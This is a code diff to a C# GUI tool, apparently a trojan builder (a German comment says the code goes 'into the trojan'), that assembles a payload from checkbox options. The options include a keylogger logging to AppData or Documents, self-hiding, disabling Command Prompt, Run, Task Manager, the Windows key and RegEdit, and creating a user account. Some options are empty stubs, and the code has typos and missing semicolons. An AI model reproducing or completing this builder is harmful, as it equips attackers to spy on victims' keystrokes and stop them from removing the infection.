@@ -6,6 +6,7 @@ using System.Windows.Input;
 using Microsoft.CSharp;
 using System.CodeDom.Compiler;
 using System.Text;
+using System.IO;
 
 namespace DNAV_GUI
 {
@@ -1133,6 +1134,8 @@ namespace DNAV_GUI
 
             parameters.ReferencedAssemblies.Add("System.dll");
             parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
+            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
+            parameters.ReferencedAssemblies.Add("System.DirectoryServices.dll");
 
 
             string code = "using System;using System.Threading;";
@@ -1163,7 +1166,81 @@ namespace DNAV_GUI
             code += "Console.WriteLine(\"Hallo Welt\");Console.ReadLine();";
             // Hier landet Code, welcher in den Trojaner soll.
 
+            if (keyloggerCheckbox.IsChecked == true)
+            {
+                if (keyloggerLocalCheckbox.IsChecked == true)
+                {
+                    code += "Thread keylogger = new Thread(() => Keylogger.EnableWithLog(";
+                    switch (keyloggerLocalCombobox.SelectedIndex)
+                    {
+                        case 0:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
+                            break;
+                        case 1:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)";
+                            break;
+                        case 2:
+                            code += "Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)";
+                            break;
+                    }
+                    code += "+ \"\\\\log.txt\"));keylogger.Start();";
+                }
 
+                if (keyloggerEmailCheckbox.IsChecked == true)
+                {
+
+                }
+            }
+
+            if (hideCheckbox.IsChecked == true)
+            {
+                code += @"Keylogger.Hide();";
+            }
+
+            if (autostartCheckbox.IsChecked == true)
+            {
+                code += @"";
+            }
+
+            if (screenshotCheckbox.IsChecked == true)
+            {
+                code += @"";
+            }
+
+            if (cmdCheckbox.IsChecked == true)
+            {
+                code += @"Cmd.Disbable();";
+            }
+
+            if (runCheckbox.IsChecked == true)
+            {
+                code += @"Run.Disbable();";
+            }
+
+            if (taskmanagerCheckbox.IsChecked == true)
+            {
+                code += @"Taskmanager.Disable();";
+            }
+
+            if (windowskeyCheckbox.IsChecked == true)
+            {
+                code += @"WindowsKey.Disable();";
+            }
+
+            if (powershellCheckbox.IsChecked == true)
+            {
+                code += @"";
+            }
+
+            if (regeditCheckbox.IsChecked == true)
+            {
+                code += @"RegEdit.Disable()";
+            }
+
+            if (createUserCheckbox.IsChecked == true)
+            {
+                code += @"User.Create(" + createUserUsernameTextbox.Text + ", " + createUserPasswortTextbox.Password + ")";
+            }
 
             code += "}"; // Close void Main
             code += "}"; // Close class Program
